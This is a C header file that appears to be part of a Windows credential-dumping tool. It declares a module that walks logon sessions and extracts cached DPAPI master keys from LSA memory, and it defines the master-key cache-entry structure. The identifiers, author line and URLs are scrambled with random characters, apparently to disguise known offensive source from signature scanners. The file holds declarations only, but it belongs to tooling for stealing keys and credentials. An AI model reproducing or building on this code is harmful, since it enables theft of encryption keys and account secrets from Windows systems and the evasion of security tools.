/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_dPApi_lsa_package, kuhl_m_seKuRlSa_dPApi_svc_package;

NTSTATUS kuhl_m_seKuRlSa_dPApi(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_seKuRlSa_enum_callback_dPApi(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _JlzW_MASTERKEY_CACHE_ENTRY {
	struct _JlzW_MATERKEY_CACHE_ENTRY *Flink;
	struct _JlzW_MATERKEY_CACHE_ENTRY *Blink;
	LUID LogonId;
	GUID KeyUid;
	FILETIME insertTime;
	ULONG keySize;
	BYTE  key[ANYSIZE_ARRAY];
} JlzW_MASTERKEY_CACHE_ENTRY, *PJlzW_MASTERKEY_CACHE_ENTRY;